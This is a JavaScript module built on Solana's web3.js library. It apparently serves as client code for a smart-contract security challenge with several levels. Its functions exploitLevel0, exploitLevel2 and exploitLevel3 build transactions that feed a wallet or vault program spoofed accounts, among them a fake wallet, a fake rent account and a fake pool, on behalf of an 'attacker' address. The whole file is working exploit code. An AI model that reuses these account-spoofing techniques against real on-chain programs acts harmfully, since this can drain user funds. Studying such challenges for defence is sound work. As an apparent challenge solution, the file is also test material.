const {
  TransactionInstruction,
  SYSVAR_RENT_PUBKEY,
  SystemProgram,
  PublicKey,
  Account,
} = require("@solana/web3.js");

const lo = require("@solana/buffer-layout");

const WALLET_LEN = 64;
const WALLET = lo.struct([
  lo.seq(lo.u8(), 32), // authority (Pubkey)
  lo.seq(lo.u8(), 32), // vault (Pubkey)
]);

const PUBKEY = lo.seq(lo.u8(), 32);

function AccountMetaReadonly(pubkey, isSigner) {
  return {
    pubkey,
    isWritable: false,
    isSigner,
  };
}

function AccountMeta(pubkey, isSigner) {
  return {
    pubkey,
    isWritable: true,
    isSigner,
  };
}

function bytesToArray(b) {
  let a = new Array(b.length);
  for (var i = 0; i < b.length; i++) {
    a[i] = b[i];
  }
  return a;
}

function packInt64(x) {
  if (typeof x == "bigint") {
    let rv = new Array(8);
    let ba = new BigUint64Array(1);
    let buffer = new Uint8Array(ba.buffer);
    ba[0] = x;
    for (var i = 0; i < buffer.length; i++) {
      rv[i] = buffer[i];
    }
    return rv;
  } else {
    let rv = new Array(8);
    const U64 = lo.nu64be();
    let buffer = new Uint8Array(8);
    U64.encode(x, buffer);
    for (var i = 0; i < buffer.length; i++) {
      rv[i] = buffer[i];
    }
    rv.reverse();
    return rv;
  }
}

function packFloat64(x) {
  let rv = new Array(8);
  let f64 = new Float64Array(1);
  let u8 = new Uint8Array(f64.buffer);
  f64[0] = x;
  for (var i = 0; i < u8.length; i++) {
    rv[i] = u8[i];
  }
  return rv;
}

function exploitLevel0(
  exploitProgramId,
  walletAddress,
  vaultAddress,
  authorityAddress
) {
  const walletMeta = AccountMeta(walletAddress, false);
  const authorityMeta = AccountMeta(authorityAddress, true);
  const keys = [
    walletMeta,
    authorityMeta,
    AccountMeta(SYSVAR_RENT_PUBKEY, false),
    AccountMeta(SystemProgram.programId, false),
  ];
  let instruction = new TransactionInstruction({
    keys,
    programId: exploitProgramId,
    data: [0].concat(PUBKEY.decode(vaultAddress.toBytes())),
  });
  return instruction;
}

function exploitLevel2(exploitProgramId, walletProgramId, attackerAddress) {
  const [fakeWalletAddress, _] = PublicKey.findProgramAddressSync(
    [attackerAddress.toBytes()],
    exploitProgramId
  );
  const [fakeRentAddress, __] = PublicKey.findProgramAddressSync(
    [attackerAddress.toBytes(), Buffer.from("RENT")],
    exploitProgramId
  );
  const fakeWalletMeta = AccountMeta(fakeWalletAddress, false);
  const fakeRentMeta = AccountMeta(fakeRentAddress, false);
  const authorityMeta = AccountMeta(attackerAddress, true);
  const keys = [
    fakeWalletMeta,
    fakeRentMeta,
    authorityMeta,
    AccountMeta(SYSVAR_RENT_PUBKEY, false),
    AccountMeta(SystemProgram.programId, false),
  ];
  let instruction = new TransactionInstruction({
    keys,
    programId: exploitProgramId,
    data: [1]
      .concat(PUBKEY.decode(walletProgramId.toBytes()))
      .concat(PUBKEY.decode(attackerAddress.toBytes())),
  });
  return [instruction, fakeWalletAddress, fakeRentAddress];
}

function exploitLevel3(exploitProgramId, vaultAddress, attackerAddress, value) {
  const [fakePoolAddress, __] = PublicKey.findProgramAddressSync(
    [Buffer.from("FAKE")],
    exploitProgramId
  );
  const attackerMeta = AccountMeta(attackerAddress, true);
  const fakePoolMeta = AccountMeta(fakePoolAddress, false);
  const rentMeta = AccountMeta(SYSVAR_RENT_PUBKEY, false);
  const spMeta = AccountMetaReadonly(SystemProgram.programId, false);
  const keys = [attackerMeta, fakePoolMeta, rentMeta, spMeta];
  let instruction = new TransactionInstruction({
    keys,
    programId: exploitProgramId,
    data: [2]
      .concat(PUBKEY.decode(vaultAddress.toBytes()))
      .concat(packInt64(value)),
  });
  return [instruction, fakePoolAddress];
}

exports.Exploit = {
  exploitLevel0,
  exploitLevel2,
  exploitLevel3,
  packInt64,
  packFloat64,
  WALLET_LEN: WALLET_LEN,
};
